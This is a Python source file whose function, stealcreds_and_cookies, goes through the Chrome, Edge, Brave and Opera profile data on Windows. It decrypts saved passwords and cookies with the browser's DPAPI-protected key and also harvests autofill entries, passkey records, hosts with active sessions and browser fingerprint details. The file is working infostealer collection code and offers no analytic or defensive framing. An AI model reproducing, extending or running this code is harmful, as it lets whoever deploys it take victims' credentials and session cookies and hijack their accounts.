import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

BROWSERS = {
    "Chrome": os.path.join("Google", "Chrome"),
    "Edge": os.path.join("Microsoft", "Edge"),
    "Brave": os.path.join("BraveSoftware", "Brave-Browser"),
    "Opera": os.path.join("Opera Software", "Opera Stable"),
}

def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def get_encryption_key(browser_path):
    local_state_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", browser_path, "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1])
        except Exception:
            return "No Passwords(logged in with Social Account)"

def decrypt_cookie(enc_cookie, key):
    try:
        if enc_cookie[:3] == b'v10':
            init_vector = enc_cookie[3:15]
            enc_cookie = enc_cookie[15:]
            cipher = AES.new(key, AES.MODE_GCM, init_vector)
            return cipher.decrypt(enc_cookie)[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(enc_cookie, None, None, None, 0)[1].decode()
    except Exception:
        return ""

def get_user_agent(browser_path):
    prefs_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", browser_path, "User Data", "Default", "Preferences"
    )
    if os.path.exists(prefs_path):
        with open(prefs_path, "r", encoding="utf-8") as f:
            prefs = json.load(f)
            return prefs.get("profile", {}).get("content_settings", {}).get("user_agent", "")
    return ""

def get_extensions(browser_path):
    ext_dir = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", browser_path, "User Data", "Default", "Extensions"
    )
    extensions = []
    if os.path.exists(ext_dir):
        for ext_id in os.listdir(ext_dir):
            ext_path = os.path.join(ext_dir, ext_id)
            if os.path.isdir(ext_path):
                extensions.append(ext_id)
    return extensions

def get_browser_version(browser_path):
    prefs_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", browser_path, "User Data", "Local State"
    )
    if os.path.exists(prefs_path):
        with open(prefs_path, "r", encoding="utf-8") as f:
            prefs = json.load(f)
            return prefs.get("browser", {}).get("last_version", "")
    return ""

def stealcreds_and_cookies():
    results = {}
    for browser, path in BROWSERS.items():
        browser_result = {}

        # --- Saved Passwords ---
        try:
            login_db = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", path, "User Data", "Default", "Login Data"
            )
            if os.path.exists(login_db):
                shutil.copyfile(login_db, "browser_login_data.db")
                db = sqlite3.connect("browser_login_data.db")
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                key = get_encryption_key(path)
                browser_data = []
                for row in cursor.fetchall():
                    site_url = row[0]
                    username = row[1]
                    password = decrypt_password(row[2], key)
                    date_created = row[3]
                    if username or password:
                        browser_data.append({
                            "site": site_url,
                            "username": username,
                            "password": password,
                            "date_created": str(my_chrome_datetime(date_created))
                        })
                if browser_data:
                    browser_result["credentials"] = browser_data
                cursor.close()
                db.close()
                os.remove("browser_login_data.db")
        except Exception:
            pass

        # --- Cookies (all) ---
        try:
            cookies_db = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", path, "User Data", "Default", "Cookies"
            )
            if os.path.exists(cookies_db):
                shutil.copyfile(cookies_db, "browser_cookies_data.db")
                db = sqlite3.connect("browser_cookies_data.db")
                cursor = db.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
                key = get_encryption_key(path)
                cookies_data = []
                active_sessions = set()
                for row in cursor.fetchall():
                    host = row[0]
                    name = row[1]
                    enc_value = row[2]
                    path_ = row[3]
                    expires = row[4]
                    value = decrypt_cookie(enc_value, key)
                    cookies_data.append({
                        "host": host,
                        "name": name,
                        "value": value,
                        "path": path_,
                        "expires": str(my_chrome_datetime(expires))
                    })
                    # Active session detection (common session/auth cookie names)
                    if name.lower() in ["session", "sessionid", "sid", "auth", "token", "ds_user_id", "csrftoken", "__secure-1psid"]:
                        active_sessions.add(host)
                if cookies_data:
                    browser_result["cookies"] = cookies_data
                if active_sessions:
                    browser_result["active_sessions"] = list(active_sessions)
                cursor.close()
                db.close()
                os.remove("browser_cookies_data.db")
        except Exception:
            pass

        # --- Autofill Data ---
        try:
            autofill_db = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", path, "User Data", "Default", "Web Data"
            )
            if os.path.exists(autofill_db):
                shutil.copyfile(autofill_db, "browser_autofill_data.db")
                db = sqlite3.connect("browser_autofill_data.db")
                cursor = db.cursor()
                cursor.execute("SELECT name, value, date_created FROM autofill")
                autofill_data = []
                for row in cursor.fetchall():
                    autofill_data.append({
                        "name": row[0],
                        "value": row[1],
                        "date_created": str(my_chrome_datetime(row[2]))
                    })
                if autofill_data:
                    browser_result["autofill"] = autofill_data
                cursor.close()
                db.close()
                os.remove("browser_autofill_data.db")
        except Exception:
            pass

        # --- Passkeys (WebAuthn) ---
        try:
            webauthn_db = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", path, "User Data", "Default", "WebAuthn", "WebAuthn.db"
            )
            if os.path.exists(webauthn_db):
                shutil.copyfile(webauthn_db, "browser_webauthn_data.db")
                db = sqlite3.connect("browser_webauthn_data.db")
                cursor = db.cursor()
                cursor.execute("SELECT rpId, credentialId, userHandle, signCount FROM credentials")
                passkeys = []
                for row in cursor.fetchall():
                    passkeys.append({
                        "rpId": row[0],
                        "credentialId": base64.b64encode(row[1]).decode(),
                        "userHandle": base64.b64encode(row[2]).decode() if row[2] else "",
                        "signCount": row[3]
                    })
                if passkeys:
                    browser_result["passkeys"] = passkeys
                cursor.close()
                db.close()
                os.remove("browser_webauthn_data.db")
        except Exception:
            pass

        # --- Fingerprinting ---
        try:
            browser_result["user_agent"] = get_user_agent(path)
            browser_result["browser_version"] = get_browser_version(path)
            browser_result["extensions"] = get_extensions(path)
            browser_result["os"] = os.name
        except Exception:
            pass

        if browser_result:
            results[browser] = browser_result
    return results